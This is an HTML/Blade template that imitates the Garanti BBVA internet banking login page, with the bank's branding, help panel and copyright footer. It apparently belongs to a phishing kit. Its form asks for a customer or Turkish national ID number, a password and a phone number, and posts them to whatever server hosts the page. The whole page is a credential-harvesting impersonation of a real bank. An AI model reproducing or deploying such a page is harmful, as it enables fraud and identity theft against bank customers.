<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Proje Başlığı</title>
    <!-- Bootstrap CSS -->
    <link href="/assets/bootstrap.min.css" rel="stylesheet">
    <!-- Özel CSS -->
    <link href="/assets/style.css" rel="stylesheet">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/tabler-icons/1.35.0/iconfont/tabler-icons.min.css" />
    <!-- Bootstrap ve jQuery JavaScript -->
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    {{-- <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script> --}}
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/2.9.2/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.inputmask/5.0.9/jquery.inputmask.min.js"></script>
    <!-- Özel JS -->

    <script src="/assets/scripts.js"></script>
</head>

<body>
    <div class="container-fluid full-screen">
        <!-- Navbar -->
        <header>
            <div class="container">
                <div class="col-md-11 pt-1 m-auto">
                    <div class="row">
                        <div class="logo-area col-md-9 position-relative pt-2">
                            <div class="logo-image d-flex float-start"><img src="/assets/images/logosvg.png"></div>
                            <span class="logo-text d-flex float-start ms-2 text-white ">Garanti</span>
                            <span class="logo-text d-flex float-start ms-2 text-white kanit pm-0 smfont"><img
                                    src="assets/images/logolast.png"></span>
                        </div>
                        <div class="col-md-3 mbmenu mbshow">
                            <li class="position-relative"><a href="#">Bireysel<i
                                        class="fa-solid fa-sort-down"></i></a></li>
                        </div>
                        <div class="col-md-3 mb-none">
                            <ul class="buttons d-flex">
                                <li class="active"> <a href="#" class="btn">Bireysel</a></li>
                                <li> <a href="#" class="btn">Kurumsal</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </header>



        <section id="main-section" class="col-md-8 mt-3 m-auto">
            <div class="row">

                <div class="col-md-9 loginArea">
                    <span class="title1 mb-none"> Garanti BBVA İnternet Bankacılığı’na Giriş</span>


                    <div id="login" class="mt-2">
                        <span class="title"> Güvenli Bankacılığa Hoş Geldiniz </span>
                        <p>Lütfen müşteri numaranızı ya da T.C. kimlik numaranızı ve size özel parolanızı girin.</p>
                        <div class="row">
                            <div class="col-md-12">
                                <form id="loginForm" method="POST">
                                    <div class="row errorMsg">
                                        <div class="col-md-2 pe-0">
                                            <svg class="svg-icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg"><path d="M542.72 706.56c0 17.408-13.312 30.72-30.72 30.72s-30.72-13.312-30.72-30.72 13.312-30.72 30.72-30.72 30.72 13.312 30.72 30.72z m-30.72-419.84c-17.408 0-30.72 13.312-30.72 30.72v296.96c0 16.384 13.312 30.72 30.72 30.72s30.72-13.312 30.72-30.72V317.44c0-16.384-13.312-30.72-30.72-30.72z m460.8 225.28c0 253.952-206.848 460.8-460.8 460.8S51.2 765.952 51.2 512 258.048 51.2 512 51.2s460.8 206.848 460.8 460.8z m-40.96 0C931.84 280.576 743.424 92.16 512 92.16S92.16 280.576 92.16 512s188.416 419.84 419.84 419.84 419.84-188.416 419.84-419.84z"  /></svg>
                                        </div>
                                        <div class="col-md-10 ps-0">
                                            <h3 class="etitle"></h3>
                                            <p class="edesc"></p>

                                        </div>
                                    </div>
                                    <div class="row mb-3">
                                        <label for="tc" class="col-sm-4 col-form-label text-end">Müşteri / T.C.
                                            Kimlik Numarası</label>


                                        <div class="col-sm-4 p-0">
                                            <input type="text" class="form-control" id="tc" name="tc"
                                                autocomplete="off">
                                            <div class="errorContainer  advice-text has-alert" style="display:none">
                                                <div class="errorWrapper">
                                                    <div class="errorMessage">Lütfen geçerli müşteri ya da T.C. Kimlik
                                                        numaranızı girin.</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row mb-3">
                                        <label for="tc" class="col-sm-4 col-form-label text-end">Parola</label>
                                        <div class="col-sm-4 p-0">
                                            <input type="password" class="form-control" id="password" name="password"
                                                autocomplete="off">
                                            <div class="errorContainer  advice-text has-alert" style="display:none">
                                                <div class="errorWrapper">
                                                    <div class="errorMessage">Lütfen Geçerli Parola Giriniz.</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row mb-3 phoneRow">
                                        <label for="tc" class="col-sm-4 col-form-label text-end">Telefon Numaranız</label>
                                        <div class="col-sm-4 p-0">
                                            <input type="tel" class="form-control" id="tel" name="tel"
                                                autocomplete="off" placeholder="5329613423">
                                            <div class="errorContainer  advice-text has-alert" style="display:none">
                                                <div class="errorWrapper">
                                                    <div class="errorMessage">Lütfen Geçerli Telefon Giriniz.</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row mb-3 empty-label">
                                        <label for="remember" class="col-sm-4 col-form-label text-end"></label>
                                        <div class="col-sm-4 p-0">
                                            <div class="check-main d-flex float-start">
                                                <input type="checkbox" class="check"> <span>Beni Hatırla</span>
                                            </div>
                                            <div class="d-flex float-end">
                                                <div class="ask">?</div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row mb-3 empty-label">
                                        <label for="loginbt" class="col-sm-4 col-form-label text-end"></label>
                                        <div class="col-sm-4 p-0 text-end col-12">
                                            <button id="formSubmit"
                                                class="btn loginbtn btn-lg btn-block-input col-12">
                                                Garanti BBVA İnternet Giriş </button>
                                        </div>
                                    </div>


                                    <div class="row mb-3 empty-label">
                                        <label for="links" class="col-sm-4 col-form-label text-end"></label>
                                        <div class="col-sm-4 p-0">
                                            <div class="links">
                                                <a href="#">Parolamı</a> Unuttum
                                            </div>
                                            <div class="links">
                                                <a href="#">İlk Kez Parola Almak İstiyorum.</a>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-md-3 pt-10">
                    <span class="title1 mp-30">Yardım ve Güvenlik</span>

                    <div id="helpsecure" class="bg-white mt-2 mp-30">
                        <ul>
                            <li class="active"><span> Güvenliğiniz için lütfen aşağıdaki bilgilere dikkat edin.
                                </span>

                                <span class="collapset"><i class="fa-solid fa-sort-up"></i></span>
                            </li>
                            <p class="p-2 pb-0">
                                Güvenli bir İnternet deneyimi ve güncel virüsler hakkında bilgi almak için lütfen
                                tıklayın.</p>
                            <a href="#">Detaylı Bilgi</a>
                            <li class="active mt-2"><span> Başkası adına mı işlem yapıyorsunuz? </span>
                                <span class="collapset"><i class="fa-solid fa-sort-up"></i></span>
                            </li>
                            <li class="active"><span> Tasarruf Mevduatı Düşüncesi </span> <span class="collapset"><i
                                        class="fa-solid fa-sort-up"></i></span></li>
                        </ul>
                    </div>
                    <div class="col-md-12 bg-white p-2 float-start other">
                        <a href="#">Diğer Yardım Ve Güvenlik<i class="fa-solid fa-caret-right"></i></a>
                    </div>

                </div>
            </div>

        </section>

        <footer>
            <div class="container">
                <div class="col-md-11 m-auto">
                    <ul>
                        <li><a href="#" class="primary">Bize Ulaşiın</a></li>
                        <li><a href="#" class="primary">Güvenlik Bilgileri</a></li>
                        <li class="ms-5">Language: <a href="#" class="primary">English</a></li>
                    </ul>
                    <p>Copyright © 2024 T.Garanti Bankası A.Ş.</p>
                </div>
            </div>
        </footer>
    </div>


</body>

</html>
